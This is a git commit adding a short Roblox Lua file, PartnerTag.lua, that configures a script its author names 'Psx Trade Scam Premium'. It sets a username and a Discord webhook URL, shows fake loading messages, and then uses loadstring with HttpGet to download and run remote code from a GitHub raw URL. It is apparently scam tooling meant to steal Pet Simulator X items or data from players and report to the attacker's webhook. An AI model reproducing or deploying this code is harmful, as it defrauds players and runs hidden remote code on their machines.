ef5daab6a30620ac44ef41e383ed1232f8bf8e89
CorruptedClan <105439556+CorruptedClan@users.noreply.github.com>
2023-04-22 15:58:29 +0300

    Create PartnerTag.lua

---
+++ PartnerTag.lua
@@ -0,0 +1,18 @@
+Username = "Wizard_CatWhite"
+
+WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Psx Trade Scam Premium"
+
+_G.Text1 = "Loading"
+
+_G.Text2 = "Loaded"
+
+_G.Text3 = "Executing"
+
+_G.Text4 = "Waiting..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+
